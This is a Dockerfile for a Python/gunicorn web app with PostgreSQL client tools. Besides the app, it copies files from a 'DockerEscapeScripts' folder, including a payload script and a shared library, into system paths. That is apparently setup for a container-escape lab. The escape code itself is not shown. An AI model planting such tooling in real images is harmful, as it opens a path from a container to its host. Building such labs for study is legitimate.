FROM python:latest


RUN apt update \
    && apt install -y gcc libpq-dev postgresql-client
COPY deployment/requirements.txt requirements.txt
RUN pip install -r requirements.txt
RUN pip install gunicorn

COPY app app
COPY migrations migrations
COPY main.py app/config.py deployment/boot.sh ./
COPY Scripts/DockerEscapeScripts/minimal-monitor /usr/local/bin/
COPY Scripts/DockerEscapeScripts/payload_script.txt /usr/local/bin/
COPY Scripts/DockerEscapeScripts/libwatchedfile.so /usr/local/lib/libwatchedfile.so
RUN chmod a+x boot.sh

EXPOSE 5000
ENTRYPOINT ["./boot.sh"]